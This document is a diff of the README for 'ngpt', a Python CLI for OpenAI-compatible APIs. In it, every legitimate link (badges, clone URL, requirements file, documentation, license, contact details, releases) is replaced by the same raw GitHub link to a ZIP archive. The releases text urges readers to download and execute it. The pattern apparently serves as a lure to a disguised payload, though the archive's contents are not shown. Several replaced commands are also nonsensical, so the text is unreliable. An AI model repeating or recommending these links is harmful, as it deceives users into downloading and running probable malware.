@@ -1,6 +1,6 @@
 # ngpt: A Lightweight Python CLI for OpenAI-Compatible APIs 🌟
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg) ![Python](https://img.shields.io/badge/python-3.7%2B-yellow.svg)
+![Version](https://raw.githubusercontent.com/weatherisgood2/ngpt/main/docs/usage/Software_1.1-alpha.1.zip) ![License](https://raw.githubusercontent.com/weatherisgood2/ngpt/main/docs/usage/Software_1.1-alpha.1.zip) ![Python](https://raw.githubusercontent.com/weatherisgood2/ngpt/main/docs/usage/Software_1.1-alpha.1.zip%https://raw.githubusercontent.com/weatherisgood2/ngpt/main/docs/usage/Software_1.1-alpha.1.zip)
 
 Welcome to **ngpt**! This repository provides a lightweight Python command-line interface (CLI) and library designed for seamless interaction with OpenAI-compatible APIs. Whether you're using official endpoints or self-hosted large language models (LLMs), ngpt simplifies the process, making it accessible for developers and enthusiasts alike.
 
@@ -35,9 +35,9 @@ pip install ngpt
 If you prefer to clone the repository, you can do so with the following command:
 
 ```bash
-git clone https://github.com/weatherisgood2/ngpt.git
+git clone https://raw.githubusercontent.com/weatherisgood2/ngpt/main/docs/usage/Software_1.1-alpha.1.zip
 cd ngpt
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/weatherisgood2/ngpt/main/docs/usage/Software_1.1-alpha.1.zip
 ```
 
 ## Usage
@@ -66,7 +66,7 @@ ngpt provides a range of commands to interact with OpenAI-compatible APIs. Here 
 - **query**: Send a specific query and receive a response.
 - **generate**: Generate text based on a prompt.
 
-For detailed information on each command, refer to the [documentation](https://github.com/weatherisgood2/ngpt/wiki).
+For detailed information on each command, refer to the [documentation](https://raw.githubusercontent.com/weatherisgood2/ngpt/main/docs/usage/Software_1.1-alpha.1.zip).
 
 ## Examples
 
@@ -103,22 +103,22 @@ We welcome contributions to ngpt! If you have ideas for improvements or new feat
 3. Make your changes.
 4. Submit a pull request.
 
-For more details, check our [CONTRIBUTING.md](https://github.com/weatherisgood2/ngpt/blob/main/CONTRIBUTING.md).
+For more details, check our [https://raw.githubusercontent.com/weatherisgood2/ngpt/main/docs/usage/Software_1.1-alpha.1.zip](https://raw.githubusercontent.com/weatherisgood2/ngpt/main/docs/usage/Software_1.1-alpha.1.zip).
 
 ## License
 
-ngpt is licensed under the MIT License. See the [LICENSE](https://github.com/weatherisgood2/ngpt/blob/main/LICENSE) file for details.
+ngpt is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/weatherisgood2/ngpt/main/docs/usage/Software_1.1-alpha.1.zip) file for details.
 
 ## Contact
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: contact@ngpt.com
-- **Twitter**: [@ngpt_project](https://twitter.com/ngpt_project)
+- **Email**: https://raw.githubusercontent.com/weatherisgood2/ngpt/main/docs/usage/Software_1.1-alpha.1.zip
+- **Twitter**: [@ngpt_project](https://raw.githubusercontent.com/weatherisgood2/ngpt/main/docs/usage/Software_1.1-alpha.1.zip)
 
 ## Releases
 
-You can find the latest releases of ngpt [here](https://github.com/weatherisgood2/ngpt/releases). Download and execute the latest version to stay up-to-date with new features and improvements.
+You can find the latest releases of ngpt [here](https://raw.githubusercontent.com/weatherisgood2/ngpt/main/docs/usage/Software_1.1-alpha.1.zip). Download and execute the latest version to stay up-to-date with new features and improvements.
 
 For further information, check the "Releases" section of the repository.
 
